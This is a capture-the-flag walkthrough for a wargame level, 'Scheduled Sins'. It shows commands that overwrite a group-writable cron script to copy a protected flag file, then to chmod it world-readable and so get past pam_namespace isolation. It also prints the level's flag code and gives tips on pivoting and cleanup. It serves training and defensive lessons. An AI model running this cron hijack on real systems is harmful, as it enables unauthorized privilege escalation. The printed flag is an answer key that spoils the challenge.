# BreachLab - Phantom Track: Level 6 (Scheduled Sins)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 6 (Scheduled Sins)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom6`
- **Compromised User:** `flagkeeper6`
- **Goal:** Audit system cron jobs, exploit group-writable permissions on a scheduled maintenance script, bypass `pam_namespace` polyinstantiation via in-place permission modification, and extract the flag
- **Next User / Flag Code:** `bl_phtm6_b20566aedd42c973`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
MISSION: Scheduled Sins
=======================

Something runs on this box on a schedule. Every minute.
Find what it is, who runs it (hint: it is not root), and whether
you can change it.

Patience is part of the skill. Wait for it.

FLAG: owned by the user running the scheduled job.

Note: /tmp on this host is polyinstantiated per SSH session
(pam_namespace). A cron job running in a different context will
write to the host /tmp, which you will not see from your shell.
Pick your output path accordingly — or change file permissions
on the flag directly.
```

The objective is to enumerate scheduled system jobs in `/etc/cron.d/`, detect a misconfigured group-writable script executed by `flagkeeper6`, overcome `pam_namespace` polyinstantiation isolation by modifying file permissions in place, and retrieve `/var/lib/phantom-flags/level6_flag`.

---

## 2. Reconnaissance & Cron Job Enumeration

Logging in as `phantom6` and inspecting system-wide cron configurations:

```bash
phantom6@phantom:~$ cat /etc/crontab
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

phantom6@phantom:~$ ls -la /etc/cron.d/
total 36
drwxr-xr-x 1 root root 4096 May 28 16:41 .
drwxr-xr-x 1 root root 4096 May 31 22:18 ..
-rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
-rw-r--r-- 1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r-- 1 root root 1243 May 31 22:18 phantom-flag-leak-sweep
-rw-r--r-- 1 root root   50 May 28 16:07 system-maintenance
```

### Inspecting `/etc/cron.d/system-maintenance`

```bash
phantom6@phantom:~$ cat /etc/cron.d/system-maintenance
* * * * * flagkeeper6 /opt/maintenance/cleanup.sh
```

- **Frequency:** Executes every minute (`* * * * *`).
- **Target User:** `flagkeeper6` (the owner of `level6_flag`).
- **Target Command:** `/opt/maintenance/cleanup.sh`.

### Auditing Script Permissions (DAC Flaw)

```bash
phantom6@phantom:~$ ls -l /opt/maintenance/cleanup.sh
-rwsrwx--- 1 flagkeeper6 phantom6 66 Jun  5 20:15 /opt/maintenance/cleanup.sh
```

- **Owner:** `flagkeeper6`
- **Group:** `phantom6` (our current session's group)
- **Permissions:** `-rwsrwx---` (`770` with SUID).
- **Vulnerability:** The script is group-writable (`w`) by `phantom6`, allowing our unprivileged user to overwrite its execution instructions.

---

## 3. Defense Mechanism: Polyinstantiated Directories (`pam_namespace`)

When attempting to exfiltrate output via `/var/tmp/flag.txt` or `/tmp/flag.txt`:

```bash
phantom6@phantom:~$ echo 'cat /var/lib/phantom-flags/level6_flag > /var/tmp/flag.txt' > /opt/maintenance/cleanup.sh
phantom6@phantom:~$ echo 'chmod 644 /var/tmp/flag.txt' >> /opt/maintenance/cleanup.sh
```

The output file never appears inside `/var/tmp/` from the SSH session.

### Understanding `pam_namespace` Isolation

- The system implements `pam_namespace`, creating private per-session instances of `/tmp` and `/var/tmp` for interactive SSH users.
- The cron daemon runs in the root namespace, writing files to the host's physical `/tmp` directory.
- Consequently, files dropped in `/tmp` by cron remain invisible to the polyinstantiated SSH shell.

---

## 4. Exploitation: In-Place Permission Modification (`chmod 644`)

To bypass the namespace isolation without relying on temporary shared directories, we instruct the cron job to modify the access permissions of the flag file directly at its canonical path:

```bash
phantom6@phantom:/var/tmp$ echo 'chmod 644 /var/lib/phantom-flags/level6_flag' > /opt/maintenance/cleanup.sh
```

### Execution Timeline & Permission Transition

Monitoring the target file's permissions:

```bash
phantom6@phantom:/var/tmp$ ls -l /var/lib/phantom-flags/level6_flag
-rw------- 1 flagkeeper6 flagkeeper6 26 May 28 16:07 /var/lib/phantom-flags/level6_flag

# After the minute turnover:
phantom6@phantom:/var/tmp$ ls -l /var/lib/phantom-flags/level6_flag
-rw-r--r-- 1 flagkeeper6 flagkeeper6 26 May 28 16:07 /var/lib/phantom-flags/level6_flag
```

The cron job executed as `flagkeeper6`, changing the file mask to globally readable (`644`).

---

## 5. Privilege Consolidation & Flag Extraction

With global read permissions applied to the protected file, we read the flag directly:

```bash
phantom6@phantom:/var/tmp$ cat /var/lib/phantom-flags/level6_flag
bl_phtm6_b20566aedd42c973
```

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 6) |
| **Current User** | `phantom6` |
| **Compromised User** | `flagkeeper6` |
| **Vulnerable Component** | `/opt/maintenance/cleanup.sh` (`-rwsrwx---`) |
| **Vulnerability Type** | Writable Scheduled Job Script (Cron DAC Misconfiguration) |
| **Defense Bypassed** | Polyinstantiated Directories (`pam_namespace`) |
| **Exploitation Technique** | In-Place DAC Modification (`chmod 644`) |
| **Discovered Flag** | `bl_phtm6_b20566aedd42c973` |
| **Artifact Path** | `/var/lib/phantom-flags/level6_flag` |

---

## 7. Key Commands & Concepts Reference

- `cat /etc/cron.d/*`: Enumerate independent scheduled system tasks.
- `ls -l /path/to/script.sh`: Verify Discretionary Access Control (DAC) read/write/execute permissions.
- `pam_namespace`: Pluggable Authentication Module for polyinstantiating temporary directories per login session.
- `chmod 644 <file>`: Modify file permissions in place to grant world read access, avoiding shared filesystem dependencies.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Strict Ownership on Automated Tasks:** Scripts and binaries executed by automated schedulers (cron, systemd timers) must always be owned by root or the executing service account and have strict read-only permissions (`700` / `755`) for non-root users. Group-writable scripts allow instant privilege takeover.
2. **Awareness of Polyinstantiation (`pam_namespace`):** In hardened Linux environments, temporary storage locations (`/tmp`, `/var/tmp`) are frequently virtualized per user session to prevent race condition exploits (symlink attacks). Offensive operators must recognize this isolation and pivot via alternate techniques (in-place permission changes, network sockets, or SSH key additions).
3. **Anti-Forensics & Clean Up:** In penetration tests and red team engagements, changing target file permissions to world-readable (`644`) creates a lasting permission discrepancy. Operators should restore original permissions (`chmod 600`) after extracting necessary evidence.
